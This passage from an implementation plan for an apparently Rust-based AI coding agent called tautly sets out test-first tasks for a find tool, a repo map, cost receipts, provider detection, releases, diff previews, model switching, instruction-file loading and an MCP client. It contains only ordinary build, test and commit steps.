- [ ] **Step 1: Write the failing tests:** `find_ranks_symbol_definition_over_path_over_text`; `find_fuzzy_path_match` (`pymtretry` finds `payment/retry.rs`); `find_kind_filter`; `find_limit_and_snippet_format` (`path:line  kind  snippet`); `find_without_index_falls_back_to_grep_and_glob`; `batched_read_returns_each_target_with_header_and_shares_30kb_cap`; `batched_read_symbol_target_uses_index`; `batched_read_rejects_more_than_10_targets`; `batched_read_records_each_file_in_tracker`; `grep_uses_trigram_candidates_when_available` (counts sandbox reads: only candidate files read); `grep_results_identical_with_and_without_index` (same output on a fixture repo); `glob_served_from_tree_when_index_ready`.
- [ ] **Step 2: Run** `cargo test -p tautly-tools --test find --test batched_read --test read_side` — Expected: FAIL.
- [ ] **Step 3: Implement.** Fuzzy path scoring: subsequence match with bonuses for path-segment starts and consecutive characters (no new dependency needed). Text matches come from `grep` on candidates, at most 5 per file. Output capped by `cap_text` at 30 KB.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): find tool, batched reads, index-backed grep and glob"`

### Task 38: Repo map (execute after Task 19)

**Checkpoint 2 amendments (binding):** Build the map from the DB-loaded tree if the index is not ready within ~200 ms (`wait_ready`), never regenerate mid-session; use `TreeView::dirs(depth)` and per-slot `lang`; compute `top_referenced` with a capped query in the background.

**Files:**
- Create: `crates/tautly-context/src/repo_map.rs`; modify `assemble.rs`, `lib.rs`
- Test: `crates/tautly-context/tests/repo_map.rs`

**Interfaces:**
- Consumes: `Index::{tree, stats}` and a new `Index::top_referenced(limit: usize) -> Vec<(String, u64)>` (add in this task), `TokenEstimator`, `Context` (Task 19).
- Produces: `fn repo_map::build(index: &Index, est: &TokenEstimator, budget: u32 /* 400 */) -> String`; `Context.repo_map: Option<String>` rendered in the stable block after the memory index; `Breakdown.repo_map: u32`.

- [ ] **Step 1: Write the failing tests:** `map_lists_top_level_dirs_with_counts_and_languages`; `map_lists_entry_points` (main.rs, lib.rs, Cargo workspace members, package.json scripts); `map_lists_most_referenced_symbols`; `map_never_exceeds_400_tokens_on_large_repo` (drops lowest-value sections first); `map_is_deterministic` (same repo → byte-identical output); `map_rendered_after_memory_index_in_stable_block`; `map_not_regenerated_mid_session`.
- [ ] **Step 2: Run** `cargo test -p tautly-context --test repo_map` — Expected: FAIL.
- [ ] **Step 3: Implement.** Section order: languages, directories, entry points, key symbols; truncate the last sections first to fit the budget.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context): repo map in the stable prompt prefix"`

---

## v1 scope additions (user-approved 2026-11-03; spec 7.11)

Tasks 39–47 follow the order in **Execution Order**. Each task's new `Event`/`Command` variants and fields are additions: `Option` fields, or `#[serde(default)]` on the rest. Each adds one insta snapshot per new variant to `event_json_shape_is_stable` (Task 23 test).

### Task 39: Turn receipts, savings meter, `tautly stats`, `tautly receipt` (execute after Task 31)

**Files:**
- Create: `crates/tautly-core/src/receipt.rs`, `crates/tautly-cli/src/cmd/{stats.rs,receipt.rs}`
- Modify:
  - `crates/tautly-tools/src/{lib.rs,read.rs,bash.rs,index_tools.rs}`: `ToolMeta.saved`.
  - `crates/tautly-core/src/{protocol.rs,ledger.rs,turn.rs,record.rs,config.rs}`.
- Test: `crates/tautly-tools/tests/savings.rs`, `crates/tautly-core/tests/receipt.rs`, `crates/tautly-cli/tests/stats.rs`

**Interfaces:**
- Consumes:
  - `Usage`/`RawUsage` and `Price` (Task 4).
  - `Ledger` (Task 25).
  - `GcRecord.tokens_freed` (Task 21).
  - `TurnFinished.evidence` (Task 44).
- Produces:
  - `enum SaveKind { Index, DiffRead, Filter }`, `struct Saved { kind: SaveKind, bytes: u64 }`, `ToolMeta.saved: Option<Saved>` (persisted with the `ToolResult` record).
  - Where tools report savings:
    - `read`: re-read answered `unchanged` or with a diff → `DiffRead`, the full range bytes (≤ 30 KB) minus the returned bytes. A `{symbol}` target → `Index`, file bytes (≤ 30 KB) minus returned bytes.
    - `outline`/`symbol` → `Index`, the same.
    - Filtered `bash` → `Filter`, `min(raw, 30 KB)` minus returned, floored at 0.
    - `refs`, `find`: `None`.
  - `struct Savings { index: u64, diff_reads: u64, context_gc: u64, filters: u64, cache_read_tokens: u64, cache_usd: Option<f64>, total_usd: Option<f64> }`. Token fields = bytes / 4.
  - `Event::TurnReceipt { turn: u32, model: ModelId, tokens_in: u64, tokens_out: u64, cache_read: u64, cache_write: u64, side_tokens: u64, cost_usd: Option<f64>, wall_ms: u64, cache_hit_ratio: Option<f64>, steps: u32, tool_calls: u32, saved: Savings }`. It is emitted right before `TurnFinished` for every reason.
  - `struct ReceiptBuilder` with:
    - `fn new(turn: u32, model: ModelId, started: Instant) -> Self`
    - `fn usage(&mut self, role: UsageRole, raw: &RawUsage, cost: Option<f64>)`
    - `fn request(&mut self, elided_tokens_out_of_context: u64)`: called once per provider request with the GC-elided tokens still out of context.
    - `fn tool(&mut self, meta: &ToolMeta)`
    - `fn finish(self, price: Option<&Price>, now: Instant) -> Event`
  - `fn Ledger::record_receipt(&self, session: &str, project: &str, root: &Path, receipt: &Event) -> Result<()>`. Table `receipts(session, project, root, turn, model, at, tokens_in, tokens_out, cache_read, cache_write, side_tokens, cost_usd, wall_ms, steps, tool_calls, saved_index, saved_diff_reads, saved_context_gc, saved_filters, cache_usd, total_usd)`; WAL as before.
  - `fn Ledger::stats(&self, since: Option<SystemTime>, by: GroupBy) -> Result<Vec<StatsRow>>`, with `enum GroupBy { Day, Model, Project }` and `struct StatsRow { key: String, turns: u64, tokens: u64, cost_usd: Option<f64>, saved_tokens: u64, saved_usd: Option<f64>, wall_ms: u64, cache_hit_ratio: Option<f64> }`. Tokens and cost come from usage rows; savings, wall time and turns from receipt rows; `Project` joins usage to receipts by session.
  - `fn Ledger::session_receipts(&self, session: &str) -> Result<Vec<StoredReceipt>>`.
  - `struct ReceiptsConfig { footer: bool /* true */ }`, `Config.receipts` (user and CLI only; the project layer drops it with a warning). The REPL footer (Task 30) reads it.
  - CLI:
    - `tautly stats [--since 7d|30d|all] [--by day|model|project] [--json]` (default `30d`, `day`).
    - `tautly receipt [--last | --session ID] [--markdown]`: default and `--last` = the most recent session of the current project.

- [ ] **Step 1: Write the failing tests.**
  - Tools:
    - `diff_reread_reports_full_minus_returned_bytes`: an 8,000-byte file read twice; the second gives `Saved{DiffRead, 8000 - returned}`;
    - `filtered_cargo_output_reports_capped_raw_minus_returned`: 100 KB raw gives `30720 - returned`;
    - `capped_but_unfiltered_output_reports_nothing`;
    - `outline_and_symbol_report_index_saving`;
    - `batched_symbol_target_reports_index_saving`;
    - `refs_and_find_report_none`.
  - Core:
    - `receipt_precedes_turn_finished_for_every_reason`: completed, cancelled, budget, max_turns;
    - `receipt_sums_main_and_side_and_reports_side_tokens`;
    - `cache_hit_ratio_formula`: `cache_read 800, tokens_in 200` → `0.8`; both 0 → `None`;
    - `context_gc_saving_counts_elided_tokens_per_later_request`: GC frees 3,000 tokens before request 2 of 3 → `context_gc == 6000`;
    - `cache_usd_formula_can_be_negative`: a cold write-heavy turn gives `< 0`;
    - `total_usd_prices_gc_at_cache_read_and_is_none_without_prices`;
    - `wall_ms_spans_turn_started_to_finished`;
    - `receipt_row_written_to_ledger`;
    - `project_layer_cannot_set_receipts`.
  - CLI:
    - `stats_groups_by_day_model_project` (seeded ledger);
    - `stats_json_shape` (insta);
    - `receipt_markdown_labels_estimates_and_has_no_paths_prompts_or_project`: the output contains `est.`, and contains neither the root path, the prompt text nor the project name;
    - `receipt_session_id_and_last`.
- [ ] **Step 2: Run** `cargo test -p tautly-tools --test savings && cargo test -p tautly-core --test receipt && cargo test -p tautly --test stats` — Expected: FAIL.
- [ ] **Step 3: Implement.** Savings are bytes / 4 everywhere: deterministic, and labelled as estimates. A receipt is a projection of logged records, so resume rebuilds nothing extra.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core,cli): turn receipts, savings estimates, stats and receipt commands"`

### Task 40: Zero-config first run, `tautly auth add`, `tautly doctor` (execute after Task 39)

**Checkpoint 4 note (binding):** this task owns the `doctor` MCP check deferred from Task 45: every repository server whose approval is pending is a warning (test `doctor_reports_pending_repo_mcp_approval_as_warn`).

**Files:**
- Create: `crates/tautly-core/src/detect.rs`, `crates/tautly-cli/src/cmd/{auth.rs,doctor.rs}`
- Modify:
  - `crates/tautly-core/src/auth.rs`: `SecretStore::set`.
  - `crates/tautly-core/src/config.rs`: `providers.auto_detect`, `LoadedConfig.model_explicit`, built-in compat entries, telemetry warning.
  - `crates/tautly-core/src/provider_setup.rs`, `crates/tautly-provider/catalog/models.toml` (OpenRouter and Ollama entries), `crates/tautly-cli/src/main.rs`.
- Test: `crates/tautly-core/tests/detect.rs`, `crates/tautly-cli/tests/{first_run.rs,auth.rs,doctor.rs}`

**Interfaces:**
- Consumes:
  - `api_key_with`, `SecretStore`, `KeyLookup` (Task 23).
  - `Catalog`, `Tier` (Tasks 4, 27).
  - `restrict_project_layer` (Task 23).
- Produces:
  - `trait SecretStore { fn get(..) -> ..; fn set(&self, service: &str, account: &str, secret: &str) -> Result<(), AuthError>; }`; `KeyringStore` implements both.
  - `ProvidersConfig.auto_detect: bool` (default `true`); user and CLI only, so the project layer drops it with a warning like every `providers` key.
  - `LoadedConfig.model_explicit: bool`: true when any layer or flag set `model`.
  - `fn Config::effective_compat(&self) -> Vec<CompatEntry>` adds built-in `openrouter` (`https://openrouter.ai/api/v1`, key env `OPENROUTER_API_KEY`) and `ollama` (`http://localhost:11434/v1`, no key) unless the user defines those names.
  - `trait OllamaProbe { fn installed_models(&self, timeout: Duration) -> Option<Vec<String>>; }`; `HttpOllamaProbe` (`GET /api/tags`, 300 ms).
  - `enum KeySource { Env(String), Keychain(String), Ollama }`, `struct Detected { model: ModelId, provider: String, source: KeySource, warning: Option<String> }`.
  - `fn detect::detect(env: &dyn Fn(&str) -> Option<OsString>, store: &dyn SecretStore, probe: &dyn OllamaProbe, catalog: &Catalog) -> Result<Option<Detected>, AuthError>`. Order (spec 7.11.2):
    1. env `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`;
    2. keychain `anthropic`, `openai`, `google`;
    3. OpenRouter env, then keychain `compat:openrouter`;
    4. Ollama probe.
  - `fn detect::default_model(provider: &str, catalog: &Catalog) -> Option<ModelId>`: priced, `tier != Small`, window ≥ 128,000, lowest input price, then output price, then id.
  - `fn detect::ollama_model(installed: &[String], catalog: &Catalog) -> (ModelId, Option<String>)`.
  - The CLI runs detection only when `!model_explicit && auto_detect && mock_script.is_none()`, off the async threads. It prints `using <model> (from <source>) · /model to switch · tautly doctor to check` to stderr. With nothing found it exits 1 with a hint naming the env variables, `tautly auth add <provider>` and Ollama.
  - Telemetry: `[telemetry] enabled = true` → `LoadedConfig.warnings` gains `[telemetry] OpenTelemetry export is post-v1; ignored`.
  - `tautly auth add <anthropic|openai|google|openrouter|compat:NAME>`:
    - TTY: hidden prompt (`rpassword`). Otherwise one stdin line.
    - Trims; rejects blank; `set`, then `get` to verify; prints `stored key for <provider> in the <keychain name>`. Never echoes the key.
    - No keychain: exit 1 with an env-variable hint.
    - Tests use a file-backed `SecretStore` selected by `TAUTLY_TEST_SECRET_STORE=<path>`, honoured only with the `mock` cargo feature.
  - `tautly doctor [--json] [--offline]`, with `enum Level { Ok, Warn, Fail, Info }`, `struct Check { name: &'static str, level: Level, detail: String }`, `fn doctor::run(cx: &DoctorCx) -> Vec<Check>`.
    - Checks: `config, model, keys, keychain, network, data home, sandbox, git, index` (`mcp` is added by Task 45). Their levels follow spec 7.11.2.
    - Network: `GET` the model-list endpoint per provider with a key, 3 s timeout, key in a header (`x-api-key` / `Authorization: Bearer` / `x-goog-api-key`), never in the URL.
    - Exit 1 if any `Fail`.

- [ ] **Step 1: Write the failing tests.**
  - Detection:
    - `detect_order_env_then_keychain_then_openrouter_then_ollama` (table-driven, fake env/store/probe);
    - `default_model_is_cheapest_non_small_with_128k_window` (fixture catalog: anthropic large/larger/small picks the cheapest large; tie broken by output price, then id);
    - `ollama_prefers_catalog_model_else_alphabetical_with_warning`;
    - `ollama_without_models_is_not_detected`;
    - `ollama_probe_times_out_within_400ms` (wiremock delay 1 s);
    - `explicit_model_skips_detection` (probe and store never called);
    - `auto_detect_false_skips_detection`;
    - `project_layer_cannot_set_auto_detect`;
    - `builtin_compat_entries_unless_user_defines_them`;
    - `telemetry_enabled_warns_and_is_ignored`.
  - First run:
    - `mock_script_skips_detection`;
    - `no_provider_found_exits_1_with_hint`: stderr contains `tautly auth add`;
    - `startup_line_on_stderr_not_stdout`: `-p --output json` stdout is valid NDJSON and stderr starts with `using `;
    - `configured_model_without_key_fails_with_same_hint`.
  - Auth:
    - `auth_add_reads_stdin_and_writes_store`;
    - `auth_add_rejects_blank`;
    - `auth_add_never_prints_key`;
    - `auth_add_unknown_provider_errors`.
  - Doctor:
    - `doctor_healthy_exits_0`: wiremock provider endpoints return 200, plus env key, temp data home and git repo;
    - `doctor_rejected_key_fails_exit_1` (401);
    - `doctor_offline_skips_network`;
    - `doctor_sends_key_in_header_not_url`: wiremock asserts the header and an empty query;
    - `doctor_never_prints_key_values`;
    - `doctor_missing_git_is_warn_not_fail` (`PATH` without git);
    - `doctor_json_shape` (insta).
- [ ] **Step 2: Run** `cargo test -p tautly-core --test detect && cargo test -p tautly --test first_run --test auth --test doctor` — Expected: FAIL.
- [ ] **Step 3: Implement.** Detection reads env first, so the keychain is touched only when no env key exists and the probe runs only as the last resort. Catalog: add the OpenRouter ids of the three native main-tier models at OpenRouter list prices, and common Ollama models (unpriced, conservative capabilities).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(cli): zero-config provider detection, auth add, doctor"`

### Task 41: Release and installers with cargo-dist (execute after Task 53)

**Files:**
- Create: `dist-workspace.toml`, `.github/workflows/release.yml` (generated by `dist generate`, committed), `scripts/check-dist-plan.sh`
- Modify:
  - `Cargo.toml`: workspace `repository`/`homepage`, `[profile.dist]` inheriting `release`.
  - `crates/tautly-cli/Cargo.toml`: `[package.metadata.binstall]`; keyring features `apple-native`, `async-secret-service`, `tokio`, `crypto-rust`, so Linux links without libdbus.
  - `.github/workflows/ci.yml`: jobs `dist-plan`, `musl-static`.
  - README install section.
- Test: `scripts/check-dist-plan.sh`, CI job `musl-static`

**Interfaces:**
- Produces:
  - Release artifacts for `aarch64-apple-darwin`, `x86_64-apple-darwin`, `x86_64-unknown-linux-musl`, `aarch64-unknown-linux-musl`.
  - Packaging: `tautly-<target>.tar.xz` with `.sha256`, `tautly-installer.sh`, and a Homebrew formula published to the tap named in `dist-workspace.toml` (`tap = "<owner>/homebrew-tap"`; the owner is filled in from the repository URL).
  - Triggered by `v*` tags only.
  - Runners: `aarch64-unknown-linux-musl` builds on `ubuntu-24.04-arm`; `x86_64-unknown-linux-musl` on `ubuntu-latest` with `musl-tools` (`[dist.dependencies.apt]`); both macOS targets on `macos-14`.
  - Pin `cargo-dist-version`.

- [ ] **Step 1: Write the failing checks.**
  - `scripts/check-dist-plan.sh` runs `dist plan --output-format=json`. It asserts:
    - exactly the four targets;
    - installers `shell` and `homebrew`;
    - `sha256` checksums;
    - the binstall `pkg-url` template matches the planned artifact names.
  - CI job `musl-static`: `cargo build --release --target x86_64-unknown-linux-musl -p tautly`, then `file target/x86_64-unknown-linux-musl/release/tautly | grep -q 'statically linked'`, then `./tautly --version`.
- [ ] **Step 2: Run** `bash scripts/check-dist-plan.sh` — Expected: FAIL (no dist config).
- [ ] **Step 3: Implement.** Run `dist init` with the values above and `dist generate`, commit the workflow, add the binstall metadata and switch the keyring features. If the musl build cannot link the keyring backend, fall back to `-gnu` Linux targets, record that in `dist-workspace.toml` comments and the release notes, and update the check.
- [ ] **Step 4: Run** `bash scripts/check-dist-plan.sh && dist build --artifacts=local` (host target) and run `tautly --version` from the produced archive — Expected: PASS. Publishing needs the tap repository and a `HOMEBREW_TAP_TOKEN` secret, which the user creates. The first release tag is pushed by the user, not by CI.
- [ ] **Step 5: Commit** `git commit -m "build: cargo-dist releases, installers and static Linux builds"`

### Task 42: Diffs in approvals and results, `Command::Diff` (execute after checkpoint 4)

**Files:**
- Create: `crates/tautly-tools/src/preview.rs`, `crates/tautly-core/src/diff.rs`
- Modify:
  - `crates/tautly-tools/src/{lib.rs,write.rs,edit/mod.rs,edit/str_replace.rs,edit/patch.rs,edit/hashline.rs}`.
  - `crates/tautly-core/src/{protocol.rs,approvals.rs,turn.rs,engine.rs}`.
- Test: `crates/tautly-tools/tests/preview.rs`, `crates/tautly-core/tests/diff.rs`

**Interfaces:**
- Consumes:
  - The edit pipeline and tolerant applier (Tasks 11, 12, 7.9).
  - `AppliedEffect::Edited.pre_image` (Task 26 undo data).
  - The `SessionReader` (Task 18).
- Produces:
  - `#[derive(Serialize, Deserialize)] struct DiffPreview { unified: String, lines: u32, truncated: bool }`.
  - `fn unified_diff(files: &[(PathBuf /* root-relative */, Option<&[u8]>, Option<&[u8]>)], max_lines: u32, max_bytes: usize) -> DiffPreview`:
    - 3 context lines; `/dev/null` for created or deleted files; `Binary file <path> differs` for non-UTF-8 content;
    - beyond the cap, it ends with `… N more lines (diff truncated)`.
    - Approval and result caps are 200 lines / 16 KB.
  - `struct Preview { diff: DiffPreview, bases: Vec<(PathBuf, Option<blake3::Hash>)> }`.
  - `Tool::preview(&self, args: &Value, sb: &dyn Sandbox, cx: &ToolCx) -> Option<Result<Preview, ToolResult>>` (async, default `None`). `edit` (all formats) and `write` implement it with the same stale guard and matching as `run`, and never write.
  - `ToolCx.approved_bases: Option<Vec<(PathBuf, Option<blake3::Hash>)>>`. When set, `run` fails with error kind `changed_after_approval` (text `stale: file changed after approval`) if a base hash differs.
  - `ToolResult.applied_diff: Option<DiffPreview>`.
  - Wire additions:
    - `Event::ToolApprovalRequested { .., #[serde(default)] diff: Option<DiffPreview> }`
    - `Event::ToolFinished { .., #[serde(default)] diff: Option<DiffPreview> }`
    - `Command::Diff { turn: Option<u32> }`
    - `Event::SessionDiff { turn: Option<u32>, files: Vec<DiffFile>, unified: String, truncated: bool }`
    - `struct DiffFile { path: String, status: DiffStatus, added: u32, removed: u32 }`, `enum DiffStatus { Added, Modified, Deleted, #[serde(other)] Unknown }`
  - `fn diff::session_diff(reader: &SessionReader<SessionRecord>, sb: &dyn Sandbox, turn: Option<u32>, max_lines: u32 /* 2000 */) -> Result<Event, DiffError>`. Turn = user turn (the n-th `SendMessage` record).
  - Engine flow when the decision is `Ask`:
    1. Call `preview`. On `Err(result)`, finish the call with that result and do not ask.
    2. Otherwise attach the diff to `ToolApprovalRequested` and pass `bases` as `approved_bases` to `run`.

- [ ] **Step 1: Write the failing tests.**
  - Tools:
    - `preview_equals_applied_diff` (proptest over random `str_replace` edits: `preview.diff == result.applied_diff`);
    - `preview_writes_nothing` (bytes and mtime unchanged);
    - `preview_for_each_edit_format`;
    - `write_new_file_diff_uses_dev_null`;
    - `diff_capped_at_200_lines_with_marker`: 250 changed lines → `lines == 250+`, `truncated`, ends with `… N more lines (diff truncated)`;
    - `diff_capped_at_16kb`;
    - `binary_content_shows_binary_differs`.
  - Core:
    - `approval_carries_diff_preview`: Ask mode edit → `diff` contains `--- a/src/lib.rs`;
    - `failing_preview_answers_without_asking`: no match → `ToolFinished{is_error}` and no `ToolApprovalRequested`;
    - `file_changed_after_approval_fails_stale`: an external write between the request and `Approve` → error kind `changed_after_approval`, and the file keeps the external content;
    - `tool_finished_carries_applied_diff_in_every_mode` (ask, auto-edit, yolo);
    - `session_diff_net_change_per_file`: editing a file twice across turns gives one diff from the first pre-image; a file created and then deleted is absent;
    - `session_diff_turn_scope_uses_user_turns`;
    - `session_diff_capped_at_2000_lines`;
    - `old_json_without_diff_fields_parses`.
- [ ] **Step 2: Run** `cargo test -p tautly-tools --test preview && cargo test -p tautly-core --test diff` — Expected: FAIL.
- [ ] **Step 3: Implement.** Use `similar` (already in the stack) for hunks. The preview is computed on the blocking pool for files larger than 1 MB.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core,tools): diff previews in approvals and results, session diff"`

### Task 43: Mid-session model switch (execute after Task 42)

**Task 25 review note (binding):** a switch refreshes the priced/unpriced state of the session's budget enforcement. Switching to an unpriced model while `max_usd` is set re-emits the one-time `Warning` for that model, and enforces token budgets only. Switching back to a priced model restores USD enforcement, with spend so far unchanged. Test: `switch_to_unpriced_model_rewarns_and_back_restores_usd_budget`.

**Task 19 re-review note applies (binding):** on a switch to another provider, strip `Reasoning`/`RedactedReasoning` produced by a different provider before the next request.

**Files:**
- Modify: `crates/tautly-core/src/{protocol.rs,engine.rs,turn.rs,record.rs,routing.rs,provider_setup.rs,resume.rs}`, `crates/tautly-context/src/{lib.rs,assemble.rs}` (force a cold epoch)
- Test: `crates/tautly-core/tests/set_model.rs`

**Interfaces:**
- Consumes:
  - `provider_for` (Task 23).
  - `routing::side_model_id` (Task 27).
  - The cache scheduler (Task 21/7.7).
  - The `Budget` rules (Task 25).
- Produces:
  - `Command::SetModel { model: ModelId }`
  - `Event::ModelChanged { model: ModelId, provider: String }`, with `provider` ∈ `anthropic|openai|google|compat:<name>`.
  - `SessionRecord::ModelSet { model: ModelId }`, replayed by `rebuild`.
  - `fn Context::force_cold_epoch(&mut self)`: the next step start decides `ColdCache`.
  - `fn Context::strip_reasoning(&mut self, keep_provider: Option<&str>)`.
  - Engine behaviour:
    - `SetModel` applies immediately when idle, else at the next user-turn start.
    - On apply it recomputes capabilities, budget window, edit format (config override wins) and the side model (`routing.side_model` wins).
    - An unknown model or missing key → `Error{kind: ProviderFatal, retryable: false, hint: Some("… tautly auth add <provider>")}` and no change.
    - A `400`/invalid-request error whose message names `thinking`, `reasoning` or `signature`, on the first request after a same-provider switch, strips reasoning and retries once.

- [ ] **Step 1: Write the failing tests:**
  - `set_model_idle_applies_immediately_and_emits_model_changed`;
  - `set_model_during_turn_applies_at_next_user_turn`: the remaining steps of the turn use the old model; the next turn's first request uses the new one;
  - `unknown_model_or_missing_key_errors_and_keeps_model`;
  - `edit_format_follows_new_model_unless_configured`;
  - `side_model_recomputed_unless_routing_set`;
  - `first_request_after_switch_is_cold_epoch`: pending GC is applied and session pins are folded on that request;
  - `smaller_window_forces_compaction_at_next_step`: 150k used, switch to a 128k model → `Compacted{reason: Forced}` before the request;
  - `foreign_reasoning_stripped_same_provider_kept`;
  - `reasoning_rejection_strips_and_retries_once`: the mock's second failure surfaces as `Error`;
  - `model_set_survives_resume`;
  - `budget_carries_over_and_unpriced_model_warns`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test set_model` — Expected: FAIL.
- [ ] **Step 3: Implement.** The provider is rebuilt via `provider_for` on the blocking pool; keychain reads never run on the executor.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): mid-session model switch"`

### Task 44: `CLAUDE.md` fallback and evidence footer (execute after Task 43)

**Files:**
- Create: `crates/tautly-core/src/evidence.rs`
- Modify:
  - `crates/tautly-context/src/agents_md.rs`.
  - `crates/tautly-tools/src/{lib.rs,filters/mod.rs}`: `ToolMeta.counts`.
  - `crates/tautly-core/src/{protocol.rs,config.rs,turn.rs}`.
- Test: `crates/tautly-context/tests/agents_md.rs` (extend), `crates/tautly-core/tests/evidence.rs`

**Interfaces:**
- Consumes:
  - `agents_md::load` (Task 19, CP3 rounds).
  - `parse_commands` (Task 2).
  - The write generation (Task 24).
  - Output filter counts (Task 16).
- Produces:
  - `agents_md::load` keeps its signature. Per directory level it reads `AGENTS.md`, else `CLAUDE.md`, through the same resolver, confinement, ownership/mode checks and shared caps (32 KB per file / 64 KB total), and auto-pins `Constraints`/`Rules` sections from either. `AgentsMd.sources: Vec<(PathBuf, InstructionFile)>`, `enum InstructionFile { AgentsMd, ClaudeMd }`. The block header names the file used. `@path` lines are kept as text.
  - `struct TestCounts { passed: u32, failed: u32 }`, `ToolMeta.counts: Option<TestCounts>` (set by filters that parse counts).
  - `struct EvidenceConfig { test_commands: Vec<String>, replace_defaults: bool }`, `Config.evidence` (user and CLI only; the project layer drops it with a warning).
  - `const DEFAULT_TEST_COMMANDS: &[&str]` = the spec 7.11.7 list.
  - `struct TestMatcher` with `fn new(cfg: &EvidenceConfig) -> Result<Self, PolicyError>` and `fn is_test(&self, raw_cmd: &str) -> bool`: any parsed component matches.
  - `struct TestEvidence { command: String /* ≤ 200 chars */, exit_code: Option<i32>, passed: Option<u32>, failed: Option<u32>, step: u32, write_gen: u64, stale: bool, edits_since: u32, execs_since: u32 }`.
  - `Event::TurnFinished { reason: FinishReason, #[serde(default)] evidence: Option<TestEvidence> }`.
  - `struct EvidenceTracker` with `fn on_tool(&mut self, step: u32, raw_cmd: Option<&str>, result: &ToolResult, write_gen: u64)` and `fn finish(self) -> Option<TestEvidence>`. `stale` = a later `Edited|Deleted` effect, or a later `Exec{may_write: true}` that is not itself a test run.

- [ ] **Step 1: Write the failing tests.**
  - Context:
    - `claude_md_used_when_no_agents_md`;
    - `agents_md_wins_when_both_exist`;
    - `claude_md_obeys_caps_confinement_and_ownership`: an outside symlink is refused, a group-writable ancestor is refused, and a 40 KB file is truncated with the marker;
    - `claude_md_rules_section_auto_pinned`;
    - `claude_md_at_imports_kept_as_text`;
    - `block_header_names_file_used`.
  - Core:
    - `default_patterns_detect_common_test_commands`. Table: `cargo test -p x`, `cd a && pytest -q`, `npm run test -- --watch=false`, `go test ./...` are tests; `cargo build` and `echo pytest` are not;
    - `evidence_reports_last_test_run_with_counts`;
    - `edit_after_test_marks_stale_with_counts`;
    - `test_after_test_is_fresh`;
    - `non_test_exec_after_test_marks_stale`;
    - `no_test_run_gives_none`;
    - `project_layer_cannot_set_evidence`: project `[evidence] test_commands = ["true"]` is ignored with a warning;
    - `user_patterns_add_and_replace_defaults`;
    - `old_turn_finished_json_without_evidence_parses`.
- [ ] **Step 2: Run** `cargo test -p tautly-context --test agents_md && cargo test -p tautly-core --test evidence` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context,core): CLAUDE.md fallback and test evidence on TurnFinished"`

### Task 45: Tools-only MCP client (execute after Task 40)

**Files:**
- Create: `crates/tautly-mcp/{Cargo.toml,src/{lib.rs,config.rs,client.rs,tool.rs,names.rs,approvals.rs}}`, `crates/tautly-mcp/tests/fixtures/echo_server.rs` (`[[bin]]` test fixture built on `rmcp` server APIs: stdio and streamable HTTP, plus a legacy-handshake mode), `crates/tautly-cli/src/cmd/mcp.rs`
- Modify:
  - `crates/tautly-core/src/config.rs`: `[mcp]` user-only except `servers` in the project layer.
  - `crates/tautly-core/src/{engine.rs,turn.rs,protocol.rs}`.
  - `crates/tautly-sandbox/src/policy.rs`: rule tool names may be globs when they start with `mcp__`.
  - `crates/tautly-tools/src/lib.rs`: `registry` takes extra tools.
  - `crates/tautly-rpc/src/oneshot.rs`, `crates/tautly-cli/src/main.rs` (`--approve-mcp`), `crates/tautly-cli/src/cmd/doctor.rs` (`mcp` check).
- Test: `crates/tautly-mcp/tests/{client.rs,names.rs,approvals.rs}`, `crates/tautly-core/tests/mcp.rs`, `crates/tautly-cli/tests/mcp.rs`

**Interfaces:**
- Consumes:
  - `Sandbox::spawn` (Task 1).
  - `Tool`, `cap_text`/spill (Tasks 9, 10).
  - The policy (Task 3).
  - Approvals by `request_id` (Task 24).
  - `Checkpointer::snapshot` (Task 47), before stdio MCP calls.
  - The `rmcp` 3.8 client: stdio over the spawned child's `(stdout, stdin)` pair, plus streamable HTTP.
- Produces:
  - `struct McpConfig { enabled: bool, timeout_s: u64 /* 120 */, startup_timeout_ms: u64 /* 5000 */, max_tools: usize /* 50 */, import_mcp_json: bool /* true */, servers: BTreeMap<String, ServerSpec> }`.
  - `enum ServerSpec { Stdio { command: String, args: Vec<String>, env: BTreeMap<String, String>, cwd: Option<PathBuf> }, Http { url: Url, headers: BTreeMap<String, String> } }`; `enum ServerSource { User, Project, McpJson, Client }`.
  - `fn approvals::key(root: &Path, name: &str, spec: &ServerSpec) -> String`: blake3 hex of canonical root, name, transport, argv or URL, and env/header names (not values).
  - `struct ApprovalStore` with `fn open(path: &Path) -> Self`, `fn is_approved(&self, key: &str) -> bool`, `fn approve(&mut self, key: &str, root: &Path, name: &str) -> io::Result<()>` (atomic write, mode 0600).
  - `struct McpHub` with:
    - `async fn start(servers: Vec<(String, ServerSpec, ServerSource)>, sb: Arc<dyn Sandbox>, cfg: &McpConfig, strip_env: &[String]) -> McpHub`
    - `fn ready_tools(&self) -> Vec<Arc<dyn Tool>>`
    - `fn status(&self) -> Vec<ServerStatus>`
    - `async fn shutdown(&self)` (kills stdio process groups)
  - `fn names::tool_name(server: &str, tool: &str) -> String`: `[A-Za-z0-9_-]` kept, others become `_`; over 64 chars → 57 chars + `_` + 6 hex of blake3; collisions resolved by that suffix.
  - `struct McpTool: Tool`. `effect` = `Exec{argv: [command, args..]}` (stdio) or `Network{host}` (HTTP). Descriptions are truncated to 1 KB. An input schema > 8 KB skips the tool with a `Warning`. Results map text, `structuredContent` (JSON text), images (when capable) and resource links (text), then `cap_text` 30 KB with spill. Timeout `timeout_s`.
  - Wire additions:
    - `Event::McpServerApprovalRequested { request_id: String, server: String, source: String, launch: String }`, answered by `Approve`/`Deny` with that `request_id`.
    - `Event::McpServerStatus { server: String, state: McpState, tools: u32, message: Option<String> }`, `enum McpState { Starting, Ready, Failed, Skipped, AwaitingApproval, #[serde(other)] Unknown }`.
